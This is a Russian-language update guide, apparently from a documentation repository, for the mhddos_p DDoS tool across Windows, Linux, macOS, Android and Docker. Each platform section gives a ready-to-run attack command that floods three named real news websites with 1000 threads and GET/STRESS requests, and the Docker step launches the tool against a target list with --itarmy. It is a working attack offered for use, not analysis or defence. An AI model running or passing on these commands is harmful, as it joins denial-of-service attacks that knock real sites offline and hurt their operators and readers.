
<h1 align="center">Обновление mhddos_p</h1> 
April 16, 2022

<br/>
<br/>


Проблема:

![image](https://github.com/BionecX/mhddos_p_docs/blob/main/images/ph_Onovlennya-mhddos-proxy-04-16-1.png)

Решение:

#Windows

Пункт 4: [ссылка](https://github.com/BionecX/mhddos_p_docs/blob/main/docs/ph_Ustanovka-mhddos-proxy-napryamu-na-vash-komp-03-27.md) 

## Linux

1. Открыть Терминал

2. Перейти в нужную папку:

    `cd ~/mhddos_p`

3. обновить версию программы:

    `sudo git pull origin main`

4. скачать новые зависимости:

    `python3 -m pip install -r requirements.txt`

5. Можно запускать атаку:

    `python3 runner.py http://iz.com.ua https://uapress.info https://www.rupor.info -t 1000 --rpc 1000 --http-methods GET STRESS --debug`


Более подробно(пункт 2): [ссылка](https://github.com/BionecX/mhddos_p_docs/blob/main/docs/ph_mhddos-proxy-install-on-Linux-with-terminal-03-31.md)

## MacOs

1. Нажимаем на папку с mhddos_p и нажимаем правую кнопку мыши, там в списке выбираем "Службы" и выбираем "Новый терминал в папке"

Откроется окно в терминале

![image](https://github.com/BionecX/mhddos_p_docs/blob/main/images/ph_Onovlennya-mhddos-proxy-04-16-2.png)

2. обновить версию программы:

    `git pull origin main`

3. скачать новые зависимости:

    `python3 -m pip install -r requirements.txt`

4. Можно запускать атаку:

    `python3 runner.py http://iz.com.ua https://uapress.info https://www.rupor.info -t 1000 --rpc 1000 --http-methods GET STRESS --debug`


Более подробно (пункт 4): [ссылка](https://telegra.ph/Vstanovlennya-mhddos-proxy-napryamu-na-vash-Mac-04-0333)


## Android

1. Открыть Termux через иконку на главном экране

2. Зайти в папку с mhddos_p – нужно ввести:

    `cd storage/shared/mhddos_p`

3. Обновить скрипт:

    `git pull origin main`

4. Скачать новые зависимости:

    `pip install -r termux_requirements.txt`

5. Можно запускать атаку:

    `python runner.py http://iz.com.ua https://uapress.info https://www.rupor.info -t 1000 --rpc 1000 --http-methods GET STRESS --debug`

Более подробно(пункт 2): [ссылка](https://github.com/BionecX/mhddos_p_docs/blob/main/docs/installation_mhddos-proxy-for-Android-with-Termux-03-31.md)

## Docker

Просто перезапустить команду:

для Linux добавить sudo в начало

    docker run -it --rm --pull always ghcr.io/BionecX/mhddos_p --table --itarmy

